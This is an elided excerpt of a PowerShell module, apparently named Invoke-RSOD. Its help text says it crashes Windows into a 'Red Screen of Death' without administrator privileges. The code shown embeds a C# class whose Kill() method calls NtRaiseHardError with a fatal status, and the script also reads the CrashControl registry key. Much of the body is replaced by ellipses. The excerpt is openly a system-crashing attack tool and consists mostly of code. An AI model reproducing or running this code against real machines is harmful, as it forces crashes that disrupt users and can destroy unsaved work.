...
Raises an error that causes a Red Screen of Death on Windows. It does this without
requiring administrator privileges.

.EXAMPLE

PS>Import-Module .\Invoke-RSOD.ps1
PS>Invoke-RSOD
   (Red Screen Incoming...)
...
public static class CS{
	...
	public static unsafe void Kill(){
		...
		NtRaiseHardError(0x0000022, 0, 0, IntPtr.Zero, 6, out tmp2);
	}
}
"@
...
#>
	$regdata = Get-ItemProperty -path HKEY_LOCAL_MACHINE:\System\CurrentControlSet\Control\CrashControl
